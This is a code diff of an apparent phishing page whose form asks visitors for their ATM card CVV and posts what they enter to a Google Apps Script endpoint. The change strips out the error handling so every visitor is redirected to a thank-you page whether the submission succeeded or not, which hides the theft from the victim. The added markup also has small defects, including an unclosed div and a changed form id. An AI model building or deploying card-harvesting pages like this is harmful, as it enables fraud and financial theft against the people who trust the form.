@@ -90,41 +90,25 @@
       <label>ATM CVV</label> 
       <input type="text" name="CVV" placeholder="ATM 3 Digits code" required>
 
-      <div class="button-group">
-        <button type="submit" class="login-btn">VALIDATE →</button>
-      </div>
-    </form>
-  </div>
+       <div class="button-group">
+         <button type="submit">Submit</button>
+</form>
 
-  <script>
-    document.getElementById('authForm').addEventListener('submit', async function(event) {
-      event.preventDefault(); // stop default form submission
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbwhXlJQiurYt5vwIobkRLikz6OVDdUksfOj8Zrn6dt_FnyXaIsiX0YC-G8UC2jKRyJr8g/exec";
 
-      const form = event.target;
-      const data = new FormData(form);
-      const params = new URLSearchParams(data);
+  document.getElementById('demoForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-      try {
-        const response = await fetch("https://script.google.com/macros/s/AKfycbwhXlJQiurYt5vwIobkRLikz6OVDdUksfOj8Zrn6dt_FnyXaIsiX0YC-G8UC2jKRyJr8g/exec", {
-          method: "POST",
-          body: params
-        });
+    const data = new FormData(e.target);
 
-        const result = await response.text();
-        console.log("Server response:", result);
-
-        if (result.includes("Success")) {
-          // ✅ Redirect only on success
-          window.location.href = "thank_you.html";
-        } else {
-          alert("Submission failed: " + result);
-        }
-
-      } catch (err) {
-        console.error("Submission error:", err);
-        alert("There was an error submitting. Please try again.");
-      }
-    });
-  </script>
-</body>
-</html>
+    try {
+      await fetch(scriptURL, { method: 'POST', body: data });
+      // Always redirect after submission
+      window.location.href = "thank_you.html";
+    } catch (err) {
+      console.error("Error:", err);
+      window.location.href = "thank_you.html";
+    }
+  });
+</script>
